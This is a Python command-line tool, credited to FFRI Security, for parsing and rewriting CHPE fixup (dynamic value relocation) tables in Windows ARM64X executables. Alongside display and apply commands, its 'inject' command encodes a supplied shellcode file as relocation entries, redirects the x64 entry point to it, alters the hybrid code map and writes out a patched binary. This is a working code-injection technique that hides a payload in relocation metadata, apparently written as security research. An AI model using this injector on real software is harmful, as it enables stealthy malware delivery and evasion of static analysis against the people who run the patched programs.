# (c) FFRI Security, Inc., 2021 / Author: FFRI Security, Inc.
import json
import os
from dataclasses import asdict, dataclass
from enum import Enum, IntEnum
from typing import List, Optional, Tuple

import typer
from pe_patcher import *

app = typer.Typer()


class InvalidChpeFixupBlockAlignment(RuntimeError):
    pass


class UnknownChpeFixupEntryType(RuntimeError):
    pass


class InvalidChpeFixupEntryDataSize(RuntimeError):
    pass


class BrokenChpeFixupEntry(RuntimeError):
    pass


class TooLargeValue(RuntimeError):
    pass


class EntryPointChpeFixupBlockNotFound(RuntimeError):
    pass


def show_err(msg: str) -> None:
    typer.secho(msg, err=True, fg=typer.colors.RED)


def show_log(msg: str) -> None:
    typer.secho(msg, err=False, fg=typer.colors.GREEN)


def get_data_directory(
    obj: lief.PE.Binary, dir_type: lief.PE.DATA_DIRECTORY
) -> Optional[lief.PE.DataDirectory]:
    for d in obj.data_directories:
        if d.type == dir_type:
            return d
    show_err(f"{obj.name} does not have {dir_type}")
    return None


def get_required_bytes(value: int) -> int:
    l = len(bin(value)[2:])
    if l <= 16:
        return 2
    elif l <= 32:
        return 4
    elif l <= 64:
        return 8
    else:
        raise TooLargeValue()


class ChpeMetadata(Structure):
    """
    struct CHPEMetadata {
        uint32_t Version;
        uint32_t RvaOfHybridCodeMap;
        uint32_t NumberOfHybridCodeMap;
        uint32_t RvaOfX64CodeRangesToEntryPoints;
        uint32_t RvaOfArm64xRedirectionMetadata;
        uint32_t RvaOfOsArm64xDispatchCallNoRedirect;
        uint32_t RvaOfOsArm64xDispatchRet;
        uint32_t RvaOfOsArm64xDispatchCall;
        uint32_t RvaOfOsArm64xDispatchICall;
        uint32_t RvaOfOsArm64xDispatchICallCfg;
        uint32_t RvaOfX64EntryPoint;
        uint32_t RvaOfHybridAuxiliaryIat; // 0x2c
        uint32_t Field_0x30;
        uint32_t Field_0x34;
        uint32_t RvaOfOsArm64xRdtsc;
        uint32_t RvaOfOsArm64xCpuidex;
        uint32_t Field_0x40;
        uint32_t Field_0x44;
        uint32_t RvaOfOsArm64xDispatchFptr;
        uint32_t RvaOfHybridAuxiliaryIatCopy;
    };
    """

    _fields_ = (
        ("Version", c_uint32),
        ("RvaOfHybridCodeMap", c_uint32),
        ("NumberOfHybridCodeMap", c_uint32),
        ("RvaOfX64CodeRangesToEntryPoints", c_uint32),
        ("RvaOfArm64xRedirectionMetadata", c_uint32),
        ("RvaOfOsArm64xDispatchCallNoRedirect", c_uint32),
        ("RvaOfOsArm64xDispatchRet", c_uint32),
        ("RvaOfOsArm64xDispatchCall", c_uint32),
        ("RvaOfOsArm64xDispatchICall", c_uint32),
        ("RvaOfOsArm64xDispatchICallCfg", c_uint32),
        ("RvaOfX64EntryPoint", c_uint32),
        ("RvaOfHybridAuxiliaryIat", c_uint32),
        ("Field_0x30", c_uint32),
        ("Field_0x34", c_uint32),
        ("RvaOfOsArm64xRdtsc", c_uint32),
        ("RvaOfOsArm64xCpuidex", c_uint32),
        ("Field_0x40", c_uint32),
        ("Field_0x44", c_uint32),
        ("RvaOfOsArm64xDispatchFptr", c_uint32),
        ("RvaOfHybridAuxiliaryIatCopy", c_uint32),
    )


def get_chpe_metadata(obj: lief.PE.Binary):
    data_dir = get_data_directory(obj, lief.PE.DATA_DIRECTORY.LOAD_CONFIG_TABLE)
    sect: lief.PE.Section = obj.section_from_rva(data_dir.rva)
    load_config = sect.content[data_dir.rva - sect.virtual_address :]

    chpe_metadata_pointer_offset = 0xC8  # NOTE: offsetof(struct _IMAGE_LOAD_CONFIG_DIRECTORY64, CHPEMetadataPointer)
    chpe_metadata_pointer = int.from_bytes(
        load_config[chpe_metadata_pointer_offset : chpe_metadata_pointer_offset + 8],
        byteorder="little",
    )
    chpe_metadata_rva = chpe_metadata_pointer - obj.optional_header.imagebase

    sect: lief.PE.Section = obj.section_from_rva(chpe_metadata_rva)
    chpe_metadata = ChpeMetadata.from_buffer_copy(
        bytearray(sect.content[chpe_metadata_rva - sect.virtual_address :])
    )
    return chpe_metadata


@dataclass()
class HybridCodeMap:
    offset_and_meta: int
    size: int


def get_hybrid_codemap(obj: lief.PE.Binary) -> List[HybridCodeMap]:
    chpe_metadata = get_chpe_metadata(obj)
    sect: lief.PE.Section = obj.section_from_rva(chpe_metadata.RvaOfHybridCodeMap)
    beg = chpe_metadata.RvaOfHybridCodeMap - sect.virtual_address
    end = beg + chpe_metadata.NumberOfHybridCodeMap * 8
    hybrid_codemap_bytes = sect.content[beg:end]

    hybrid_codemap = list()
    for i in range(chpe_metadata.NumberOfHybridCodeMap):
        hybrid_codemap.append(
            HybridCodeMap(
                int.from_bytes(
                    hybrid_codemap_bytes[i * 8 : i * 8 + 4], byteorder="little"
                ),
                int.from_bytes(
                    hybrid_codemap_bytes[i * 8 + 4 : (i + 1) * 8], byteorder="little"
                ),
            )
        )
    return hybrid_codemap


def change_hybrid_codemap(
    obj: lief.PE.Binary, target_page_rva: int, page_type: int, size: int
) -> None:
    chpe_metadata = get_chpe_metadata(obj)
    hybrid_codemap = get_hybrid_codemap(obj)
    for i, codemap in enumerate(hybrid_codemap):
        if (codemap.offset_and_meta & 0xFFFFFFF0) == target_page_rva:
            show_log("Overwrite Hybrid Code Map")
            patch_pe_rva(
                obj,
                chpe_metadata.RvaOfHybridCodeMap + i * 8,
                target_page_rva | page_type,
                4,
            )
            patch_pe_rva(obj, chpe_metadata.RvaOfHybridCodeMap + i * 8 + 4, size, 4)


@dataclass()
class ChpeFixupHeader:
    # IMAGE_DYNAMIC_RELOCATION_TABLE
    version: int  # 0x0
    size: int  # 0x4

    # IMAGE_DYNAMIC_RELOCATION_ARM64X_HEADER
    symbol: int  # 0x8
    fixup_info_size: int  # 0x10

    @staticmethod
    def get_byte_size() -> int:
        return 0x14

    def __init__(self, content: List[int]) -> None:
        self.version = int.from_bytes(content[0:0x4], byteorder="little")
        self.size = int.from_bytes(content[0x4:0x8], byteorder="little")
        self.symbol = int.from_bytes(content[0x8:0x10], byteorder="little")
        self.fixup_info_size = int.from_bytes(content[0x10:0x14], byteorder="little")

    def get_raw_entry(self) -> "ChpeFixupHeaderRaw":
        return ChpeFixupHeaderRaw(
            self.version, self.size, self.symbol, self.fixup_info_size
        )


class ChpeFixupEntryType(str, Enum):
    ZERO_FILL = "ZERO_FILL"
    ASSIGN_VALUE = "ASSIGN_VALUE"
    DELTA = "DELTA"
    UNKNOWN = "UNKNOWN"

    @staticmethod
    def get_type(meta: int) -> "ChpeFixupEntryType":
        if meta & 0b11 == 0:
            return ChpeFixupEntryType.ZERO_FILL
        elif meta & 0b11 == 1:
            return ChpeFixupEntryType.ASSIGN_VALUE
        elif meta & 0b11 == 2:
            return ChpeFixupEntryType.DELTA
        else:
            return ChpeFixupEntryType.UNKNOWN


@dataclass()
class ChpeFixupEntry:
    meta_and_offset: int
    meta: int
    offset: int
    reloc_entry_data_size: int  # data size of reloc entry (NOTE: does not include meta and offset)
    size_to_be_written: int
    reloc_type: ChpeFixupEntryType

    def __init__(self, content: List[int]) -> None:
        self.meta_and_offset = int.from_bytes(content[0:0x2], byteorder="little")
        self.meta, self.offset = self.split_meta_and_offset(self.meta_and_offset)
        self.reloc_type = ChpeFixupEntryType.get_type(self.meta)

    def get_byte_size(self) -> int:
        return 2 + self.reloc_entry_data_size

    @staticmethod
    def get_chpe_fixup_entry(content: List[int]) -> Optional["ChpeFixupEntry"]:
        meta_and_offset = int.from_bytes(content[0:0x2], byteorder="little")
        if meta_and_offset == 0:
            if len(content) == 2:
                return None
            else:
                raise InvalidChpeFixupBlockAlignment()

        meta = (meta_and_offset & 0xF000) >> 12
        reloc_type = ChpeFixupEntryType.get_type(meta)
        if reloc_type == ChpeFixupEntryType.ZERO_FILL:
            return ChpeFixupEntryZeroFill(content)
        elif reloc_type == ChpeFixupEntryType.ASSIGN_VALUE:
            return ChpeFixupEntryAssignValue(content)
        elif reloc_type == ChpeFixupEntryType.DELTA:
            return ChpeFixupEntryDelta(content)
        else:
            raise UnknownChpeFixupEntryType()

    @staticmethod
    def split_meta_and_offset(meta_and_offset: int) -> Tuple[int, int]:
        meta = (meta_and_offset & 0xF000) >> 12
        offset = meta_and_offset & 0x0FFF
        return meta, offset

    @staticmethod
    def decode_size_metadata(meta) -> Tuple[int, int]:
        # NOTE: reloc_entry_data_size, size_to_be_written
        if meta & 0b11 == 2:
            return 2, 4
        else:
            size = 1 << ((meta & 0b1100) >> 2)
            return size, size

    def get_raw_entry(self) -> "ChpeFixupEntryRaw":
        return ChpeFixupEntryRaw(0, 0)

    def apply(self, page_offset: int, obj: lief.PE.Binary) -> None:
        raise NotImplemented("Function is not properly overrided")


@dataclass
class ChpeFixupEntryZeroFill(ChpeFixupEntry):
    def __init__(self, content: List[int]) -> None:
        super().__init__(content)
        self.reloc_entry_data_size = 0
        _, self.size_to_be_written = self.decode_size_metadata(self.meta)

    def get_raw_entry(self) -> "ChpeFixupEntryRaw":
        return ChpeFixupEntryRaw(self.meta_and_offset, 0)

    def apply(self, page_offset: int, obj: lief.PE.Binary) -> None:
        if self.size_to_be_written not in (2, 4, 8):
            raise InvalidChpeFixupEntryDataSize
        patch_pe_rva(obj, page_offset + self.offset, 0, self.size_to_be_written)


@dataclass
class ChpeFixupEntryAssignValue(ChpeFixupEntry):
    data_to_be_written: int

    def __init__(self, content: List[int]) -> None:
        super().__init__(content)
        self.reloc_entry_data_size, self.size_to_be_written = self.decode_size_metadata(
            self.meta
        )
        self.data_to_be_written = int.from_bytes(
            content[2 : 2 + self.reloc_entry_data_size], byteorder="little"
        )

    def get_raw_entry(self) -> "ChpeFixupEntryRaw":
        return ChpeFixupEntryRaw(self.meta_and_offset, self.data_to_be_written)

    def apply(self, page_offset: int, obj: lief.PE.Binary) -> None:
        if self.size_to_be_written not in (2, 4, 8):
            raise InvalidChpeFixupEntryDataSize
        patch_pe_rva(
            obj,
            page_offset + self.offset,
            self.data_to_be_written,
            self.size_to_be_written,
        )


@dataclass
class ChpeFixupEntryDelta(ChpeFixupEntry):
    delta: int
    delta_raw: int

    @staticmethod
    def calc_delta(meta: int, delta_raw: int) -> int:
        scale = 8 if (meta & 0b1000) != 0 else 4
        sign = -1 if (meta & 0b0100) != 0 else 1
        return sign * scale * delta_raw

    def __init__(self, content: List[int]) -> None:
        super().__init__(content)
        self.reloc_entry_data_size, self.size_to_be_written = self.decode_size_metadata(
            self.meta
        )
        self.delta_raw = int.from_bytes(
            content[2 : 2 + self.reloc_entry_data_size], byteorder="little"
        )
        self.delta = self.calc_delta(self.meta, self.delta_raw)

    def get_raw_entry(self) -> "ChpeFixupEntryRaw":
        return ChpeFixupEntryRaw(self.meta_and_offset, self.delta_raw)

    def apply(self, page_offset: int, obj: lief.PE.Binary) -> None:
        rva_at = page_offset + self.offset
        data_at = read_dword_rva(obj, rva_at)
        patch_pe_rva(obj, rva_at, data_at + self.delta, 4)


@dataclass()
class ChpeFixupBlock:
    base_offset: int  # 0x0
    block_size: int  # 0x4
    entries: List[ChpeFixupEntry]  # 0x8

    def __init__(self, content: List[int]) -> None:
        self.base_offset = int.from_bytes(content[0:0x4], byteorder="little")
        self.block_size = int.from_bytes(content[0x4:0x8], byteorder="little")
        self.entries = self.read_chpe_fixup_entries(content[0x8 : self.block_size])

    def get_byte_size(self) -> int:
        return self.block_size

    def get_raw_entry(self) -> "ChpeFixupBlockRaw":
        entries_raw = [entry.get_raw_entry() for entry in self.entries]
        return ChpeFixupBlockRaw(self.base_offset, self.block_size, entries_raw)

    @staticmethod
    def read_chpe_fixup_entries(content: List[int]) -> List[ChpeFixupEntry]:
        idx = 0
        entries = list()
        while idx < len(content):
            entry = ChpeFixupEntry.get_chpe_fixup_entry(content[idx:])
            if entry is None:  # padding object
                break
            entries.append(entry)
            idx += entry.get_byte_size()
        return entries


@dataclass()
class ChpeFixup:
    header: ChpeFixupHeader
    blocks: List[ChpeFixupBlock]

    @staticmethod
    def get_chpe_fixup_content(obj: lief.PE.Binary) -> Optional[List[int]]:
        if obj.load_configuration.dynamic_value_reloctable_offset == 0:
            show_err(f"{obj.name} does not have Dynamic Value Relocation Table")
            return None
        reloc_sect = obj.sections[
            obj.load_configuration.dynamic_value_reloctable_section - 1
        ]  # TODO: to be checked
        return reloc_sect.content[
            obj.load_configuration.dynamic_value_reloctable_offset :
        ]

    def __init__(self, obj: lief.PE.Binary) -> None:
        content = self.get_chpe_fixup_content(obj)
        if content is None:
            return
        self.blocks = list()
        self.header = ChpeFixupHeader(content[0 : ChpeFixupHeader.get_byte_size()])
        idx = self.header.get_byte_size()
        while idx < self.header.size:
            block = ChpeFixupBlock(content[idx:])
            idx += block.get_byte_size()
            self.blocks.append(block)


@dataclass()
class ChpeFixupEntryRaw:
    meta_and_offset: int
    data_raw: int

    def export_to(self, obj: lief.PE.Binary, va_at: int) -> None:
        patch_pe_va(obj, va_at, self.meta_and_offset, 2)
        size = self.get_byte_size() - 2
        if size not in (0, 2, 4, 8):
            raise BrokenChpeFixupEntry(f"Size should be 2 or 4 or 8 (actual {size}).")
        if size != 0:
            patch_pe_va(obj, va_at + 2, self.data_raw, size)

    def get_byte_size(self) -> int:
        meta, _ = ChpeFixupEntry.split_meta_and_offset(self.meta_and_offset)
        reloc_entry_data_size, _ = ChpeFixupEntry.decode_size_metadata(meta)
        return 2 + reloc_entry_data_size

    @staticmethod
    def make_entry_assign_value(
        rva: int, value: int, byte_len: int
    ) -> "ChpeFixupEntryRaw":
        offset = rva & 0xFFF
        byte_len = byte_len if byte_len else get_required_bytes(value)
        meta = len(bin(byte_len)[3:]) << 2 | 0b01
        return ChpeFixupEntryRaw((meta << 12) | offset, value)

    @staticmethod
    def make_entry_fill_zero(rva: int, size: int) -> "ChpeFixupEntryRaw":
        offset = rva & 0xFFF
        meta = len(bin(size)[3:]) | 0b00
        return ChpeFixupEntryRaw((meta << 12) | offset, 0)


@dataclass()
class ChpeFixupBlockRaw:
    base_offset: int
    block_size: int
    entries: List[ChpeFixupEntryRaw]

    def recalculate_byte_size(self) -> None:
        self.block_size = 4 + 4 + sum(entry.get_byte_size() for entry in self.entries)

    @staticmethod
    def needs_padding(block_size: int) -> bool:
        return block_size % 4 != 0

    def get_actual_byte_size(self) -> int:
        if self.needs_padding(self.block_size):
            return self.block_size + 2
        else:
            return self.block_size

    def get_byte_size(self) -> int:
        return self.block_size

    def export_to(self, obj: lief.PE.Binary, va_at: int) -> None:
        patch_pe_va(obj, va_at, self.base_offset, 4)
        patch_pe_va(obj, va_at + 0x4, self.get_actual_byte_size(), 4)

        cur_va = va_at + 0x8
        for entry in self.entries:
            entry.export_to(obj, cur_va)
            cur_va += entry.get_byte_size()

        # padding for alignment
        if cur_va % 4 != 0:
            patch_pe_va(obj, cur_va, 0, 2)


@dataclass()
class ChpeFixupHeaderRaw:
    version: int
    size: int
    symbol: int
    fixup_info_size: int

    # NOTE: va_at means the virtual address
    def export_to(self, obj: lief.PE.Binary, va_at: int) -> None:
        patch_pe_va(obj, va_at, self.version, 4)
        patch_pe_va(obj, va_at + 0x4, self.size, 4)
        patch_pe_va(obj, va_at + 0x8, self.symbol, 8)
        patch_pe_va(obj, va_at + 0x10, self.fixup_info_size, 8)


@dataclass()
class ChpeFixupExporter:
    header: ChpeFixupHeaderRaw
    blocks: List[ChpeFixupBlockRaw]

    def __init__(self, blocks: List[ChpeFixupBlockRaw]) -> None:
        self.blocks = blocks
        self.header = self.make_chpe_fixup_header(self.blocks)

    def zerofill_chpe_fixup(self, obj: lief.PE.Binary, va_at) -> None:
        size = self.header.fixup_info_size + ChpeFixupHeader.get_byte_size()
        obj.patch_address(va_at, [0] * size, lief.Binary.VA_TYPES.VA)

    @staticmethod
    def expand_reloc_section(
        sect: lief.PE.Section, base_reloc_size: int, new_size: int
    ) -> None:
        new_size = (
            new_size if new_size % 0x100 == 0 else (int(new_size / 0x100) + 1) * 0x100
        )
        sect.virtual_size = new_size
        sect.sizeof_raw_data = new_size
        base_reloc_content = list(sect.content[0:base_reloc_size])
        sect.content = base_reloc_content + [
            0 for _ in range(new_size - base_reloc_size)
        ]

    def export_to(self, obj: lief.PE.Binary) -> None:
        data_dir_base_reloc = get_data_directory(
            obj, lief.PE.DATA_DIRECTORY.BASE_RELOCATION_TABLE
        )
        total_fixup_size = self.calc_total_fixup_size(self.blocks)
        reloc_sect = obj.section_from_rva(data_dir_base_reloc.rva)

        chpe_fixup_va = get_chpe_fixup_va(obj)
        if chpe_fixup_va is None:
            show_err("Cannot find CHPE fixup")
            return

        new_size = data_dir_base_reloc.size + total_fixup_size
        if data_dir_base_reloc.size + total_fixup_size >= reloc_sect.virtual_size:
            show_log("Expand relocation section & clear existing relocation entries")
            self.expand_reloc_section(reloc_sect, data_dir_base_reloc.size, new_size)
        else:
            show_log("Delete existing CHPE fixup")
            self.zerofill_chpe_fixup(obj, chpe_fixup_va)

        show_log("Export CHPE fixup header")
        self.header.export_to(obj, chpe_fixup_va)
        cur_va = chpe_fixup_va + ChpeFixupHeader.get_byte_size()

        show_log("Export CHPE fixup blocks")
        for block in self.blocks:
            block.export_to(obj, cur_va)
            cur_va += block.get_actual_byte_size()

    @staticmethod
    def calc_total_fixup_size(blocks: List[ChpeFixupBlockRaw]) -> int:
        return (
            ChpeFixupExporter.calc_required_byte_size(blocks)
            + ChpeFixupHeader.get_byte_size()
        )

    @staticmethod
    def make_chpe_fixup_header(blocks: List[ChpeFixupBlockRaw]) -> ChpeFixupHeaderRaw:
        total_size = ChpeFixupExporter.calc_total_fixup_size(blocks)
        return ChpeFixupHeaderRaw(
            1, total_size - 8, 6, total_size - ChpeFixupHeader.get_byte_size()
        )

    @staticmethod
    def calc_required_byte_size(blocks: List[ChpeFixupBlockRaw]) -> int:
        return sum(block.get_actual_byte_size() for block in blocks)


def get_chpe_fixup_va(obj: lief.PE.Binary) -> Optional[int]:
    if obj.load_configuration.dynamic_value_reloctable_offset == 0:
        show_err(f"{obj.name} does not have Dynamic Value Relocation Table")
        return None
    reloc_sect = obj.sections[
        obj.load_configuration.dynamic_value_reloctable_section - 1
    ]  # TODO: to be checked
    return (
        obj.optional_header.imagebase
        + reloc_sect.virtual_address
        + obj.load_configuration.dynamic_value_reloctable_offset
    )


def export_executable(obj: lief.PE.Binary):
    builder = lief.PE.Builder(obj)
    builder.build()
    output_fname = obj.name + "_mod"
    show_log(f"Patched binary is export to {output_fname}")
    builder.write(output_fname)
    return output_fname


class ChpeFixupManipulator:
    def __init__(
        self, blocks_raw: List[ChpeFixupBlockRaw], obj: lief.PE.Binary
    ) -> None:
        self.blocks_raw = blocks_raw
        self.obj = obj

    def find_block(self, rva: int) -> Optional[ChpeFixupBlockRaw]:
        for block_raw in self.blocks_raw:
            if block_raw.base_offset == rva:
                return block_raw
        return None

    @staticmethod
    def split_by_n(a: List[int], n):
        l = int(len(a) / n) if len(a) % n == 0 else int(len(a) / n) + 1
        for i in range(l):
            yield a[n * i : n * (i + 1)]

    def inject_shellcode(self, shellcode: List[int], inject_point_rva: int) -> None:
        sect_rva = inject_point_rva
        sect_page_rva = sect_rva & 0xFFFFF000
        if target_block := self.find_block(sect_page_rva) is None:
            target_block = ChpeFixupBlockRaw(sect_page_rva, 0, [])
            self.blocks_raw.append(target_block)

        if len(shellcode) % 4 != 0:
            show_err("The size of shellcode should be divided by two")
            show_err("So padding bytes are appended")
            shellcode += [0xCC] * (4 - len(shellcode) % 4)

        for i, sc in enumerate(self.split_by_n(shellcode, 4)):
            target_block.entries.append(
                ChpeFixupEntryRaw.make_entry_assign_value(
                    i * 4, int.from_bytes(bytearray(sc), byteorder="little"), 4
                )
            )
        target_block.recalculate_byte_size()
        self.blocks_raw.sort(key=lambda x: x.base_offset)

    def patch_entrypoint(self, new_entry_point_rva: int) -> int:
        chpe_metadata = get_chpe_metadata(self.obj)
        show_log(f"rva of x64 entrypoint is {hex(chpe_metadata.RvaOfX64EntryPoint)}")

        sect: lief.PE.Section = self.obj.section_from_rva(
            chpe_metadata.RvaOfX64EntryPoint
        )
        offset = chpe_metadata.RvaOfX64EntryPoint - sect.virtual_address
        org_code = int.from_bytes(sect.content[offset : offset + 4], byteorder="little")

        target_block = self.find_block(chpe_metadata.RvaOfX64EntryPoint & 0xFFFFF000)
        if target_block is None:
            show_err(f"Cannot find entry")
            raise EntryPointChpeFixupBlockNotFound

        b_offset = (0x14 << 24) | ((new_entry_point_rva - chpe_metadata.RvaOfX64EntryPoint) >> 2)

        target_block.entries.append(
            ChpeFixupEntryRaw.make_entry_assign_value(
                chpe_metadata.RvaOfX64EntryPoint & 0xFFF,
                b_offset,
                4,
            )
        )
        target_block.recalculate_byte_size()
        return org_code


@app.command()
def apply(input_exe: str) -> None:
    if not os.path.exists(input_exe):
        show_err(f"{input_exe} does not exist")
        return

    obj = lief.PE.parse(input_exe)
    chpe_fixup = ChpeFixup(obj)
    for block in chpe_fixup.blocks:
        for entry in block.entries:
            entry.apply(block.base_offset, obj)
    export_executable(obj)
    show_log("Completed")


@app.command()
def show(input_exe: str) -> None:
    if not os.path.exists(input_exe):
        show_err(f"{input_exe} does not exist")
        return

    obj = lief.PE.parse(input_exe)

    chpe_fixup = ChpeFixup(obj)
    output_fname = "chpe_fixup.json"
    with open(output_fname, "w") as fout:
        fout.write(json.dumps(asdict(chpe_fixup), indent="\t"))
    show_log(f"CHPE fixup is exported to {output_fname}")


class ShellcodeArch(str, Enum):
    arm64 = "arm64"
    x64 = "x64"


class CodeMapType(IntEnum):
    arm64 = 0
    arm64ec = 1
    x64 = 2


def find_injection_point(obj: lief.PE.Binary, arch: ShellcodeArch) -> Optional[int]:
    if arch != ShellcodeArch.x64:
        show_err(f"Automatic injection point search is not supported for {arch}")
        return None

    hybrid_codemap = get_hybrid_codemap(obj)
    for codemap in hybrid_codemap:
        if codemap.offset_and_meta & 0xF == CodeMapType.arm64:
            return codemap.offset_and_meta & 0xFFFFFFF0
    return None


@app.command()
def inject(
    shellcode_path: str,
    input_exe: str,
    arch: ShellcodeArch,
    shellcode_entry_offset_hex: str = typer.Argument("0x00"),
    inject_point_rva_hex: Optional[str] = typer.Argument(None),
) -> None:
    if not os.path.exists(input_exe):
        show_err(f"{input_exe} does not exist")
        return

    if not os.path.exists(shellcode_path):
        show_err(f"{shellcode_path} does not exist")
        return

    obj = lief.PE.parse(input_exe)
    chpe_fixup = ChpeFixup(obj)

    if inject_point_rva_hex is None:
        show_log("Injection point is not specified.")
        show_log("So, will find suitable injection point")
        inject_point_rva = find_injection_point(obj, arch)
        if inject_point_rva is None:
            show_err("Injection point is not found")
            return
    else:
        inject_point_rva = int(inject_point_rva_hex, 16)
        if inject_point_rva & 0xFFF != 0:
            show_err(f"{inject_point_rva} is not located at page boundary")
            return

    shellcode_entry_offset = int(shellcode_entry_offset_hex, 16)

    show_log(f"Injection point is set to {hex(inject_point_rva)}")

    show_log(f"Load shellcode from {shellcode_path}")
    with open(shellcode_path, "rb") as fin:
        shellcode_payload = list(fin.read())

    show_log("Convert CHPE fixup entry to raw data")
    blocks_raw = [block.get_raw_entry() for block in chpe_fixup.blocks]

    # append CHPE fixup entry to existing entries
    show_log("Inject shellcode")
    manipulator = ChpeFixupManipulator(blocks_raw, obj)
    manipulator.inject_shellcode(shellcode_payload, inject_point_rva)

    show_log("Patch entrypoint")
    manipulator.patch_entrypoint(inject_point_rva + shellcode_entry_offset)

    # change Hybrid Code Map of target section
    # change_hybrid_codemap(obj, inject_point_rva, CodeMapType.x64, len(shellcode_payload))
    change_hybrid_codemap(
        obj, inject_point_rva, CodeMapType.arm64, len(shellcode_payload)
    )

    exporter = ChpeFixupExporter(manipulator.blocks_raw)
    exporter.export_to(obj)

    # export program
    export_executable(obj)


if __name__ == "__main__":
    app()
